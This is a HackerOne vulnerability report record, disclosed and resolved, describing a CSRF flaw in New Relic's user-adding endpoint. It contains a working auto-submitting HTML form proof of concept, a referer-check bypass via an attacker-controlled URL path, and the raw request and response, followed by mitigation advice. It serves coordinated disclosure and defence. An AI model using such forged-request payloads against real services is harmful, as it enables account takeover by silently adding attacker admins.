{
  "id": 225326,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yMjUzMjY=",
  "url": "https://hackerone.com/reports/225326",
  "title": "CSRF For Adding Users",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2017-05-01T15:54:48.251Z",
  "submitted_at": "2017-05-01T15:54:48.251Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "atestpk",
    "url": "/atestpk",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/163/510/645a3f921ef293e346825777c26dac5f3f0a4493_original.jpg/3c7b305354c9073c106ae3d1701798defaaf5be844fb8fdfa49ca62f991a2c2c"
    },
    "is_me?": false,
    "cleared": false,
    "verified": false,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 17011,
    "url": "https://hackerone.com/newrelic",
    "handle": "newrelic",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/3813a300hyp02ziarjcgo7ph6uxv/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": true,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "New Relic",
      "twitter_handle": "newrelic",
      "website": "https://newrelic.com",
      "about": "New Relic's Coordinated Disclosure Program"
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [],
  "singular_disclosure_disabled": true,
  "disclosed_at": "2017-10-11T22:54:42.477Z",
  "bug_reporter_agreed_on_going_public_at": "2017-10-11T22:54:42.393Z",
  "team_member_agreed_on_going_public_at": "2017-10-11T22:27:27.307Z",
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "*Issue*\nThe API affected is https://rpm.newrelic.com/accounts/{{accountid}}/account_views.\n\nOnly admin users are allowed to add other new users, but a normal user with knowledge of the accountid can craft a webpage which does a CSRF when an admin user visits it.\n\nThere are 2 problems with it that can result in CSRF:\n1. No check for authenticity_token \n2. There is a referer header check but it is flawed.\nhttp://attacker.com/rpm.newrelic.com/ will bypass that.\n\n*PoC* (replace accountid and host on a url that contains rpm.newrelic.com)\n```\n<html>\n<iframe style=\"width:0;height:0;border:0; border:none;\" name=\"csrf-frame\"></iframe>\n\n<form name=\"adduser\" action=\"https://rpm.newrelic.com/accounts/accountid/account_views\" method=\"post\" target=\"csrf-frame\">\n    <input type=\"submit\">\n    <input type=\"hidden\" name=\"utf8\" value=\"âœ“\">\n    <input type=\"hidden\" name=\"id\" value=\"accountid\">\n    <input type=\"hidden\" name=\"account_view[user][email]\" value=\"attacker@gmail.com\">\n    <input type=\"hidden\" name=\"account_view[user][full_name]\" value=\"attacker\">\n    <input type=\"hidden\" name=\"account_view[level]\" value=\"admin\">\n    <input type=\"hidden\" name=\"account_view[user][job_title]\" value=\"\">\n</form>\n\n<script>\ndocument.forms.adduser.submit();\n</script>\n</html>\n```\n\nAn admin who visits this will add attacker@gmail.com as an admin to the group.\n\nCSRF Request and response\n```\nPOST /accounts/1621740/account_views HTTP/1.1\nHost: rpm.newrelic.com\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:53.0) Gecko/20100101 Firefox/53.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-US,en;q=0.5\nAccept-Encoding: gzip, deflate, br\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 196\nReferer: http://redirectxss.herokuapp.com/rpm.newrelic.com/csrftest\n[.......]\n\nutf8=%E2%9C%93&id=1621740&account_view%5Buser%5D%5Bemail%5D=attacker%40gmail.com&account_view%5Buser%5D%5Bfull_name%5D=attacker&account_view%5Blevel%5D=admin&account_view%5Buser%5D%5Bjob_title%5D=\n\n==>\n\nHTTP/1.1 302 Found\nServer: nginx\nDate: Mon, 01 May 2017 15:48:12 GMT\nContent-Type: text/html; charset=utf-8\nConnection: Keep-Alive\nStatus: 302 Found\nX-Frame-Options: DENY\nX-XSS-Protection: 1; mode=block\nX-Content-Type-Options: nosniff\nLocation: https://rpm.newrelic.com/accounts/1621740\n[.....]\n\n<html><body>You are being <a href=\"https://rpm.newrelic.com/accounts/1621740\">redirected</a>.</body></html>\n``````\n\nThe following POST request is successful as it redirects to https://rpm.newrelic.com/accounts/1621740.\n\n*Mitigation*\n* Check the CSRF token.\n* Check the referer url to see if it starts with rpm.newrelic.com (or other whitelist of domains)",
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [],
  "allow_singular_disclosure_at": "2017-11-10T22:27:27.342Z",
  "allow_singular_disclosure_after": -197475223.9088537,
  "singular_disclosure_allowed": true,
  "vote_count": 7,
  "voters": [
    "sp1d3rs",
    "jon_bottarini",
    "r3y",
    "eveeez",
    "vulhunter010",
    "japz",
    "azar_the_hackerazar"
  ],
  "severity": {
    "rating": "medium",
    "author_type": "User"
  },
  "structured_scope": null,
  "abilities": {
    "assignable_team_members": [],
    "assignable_team_member_groups": []
  },
  "summaries": [
    {
      "category": "team",
      "can_view?": true,
      "can_create?": false
    },
    {
      "category": "researcher",
      "can_view?": true,
      "can_create?": false
    }
  ]
}
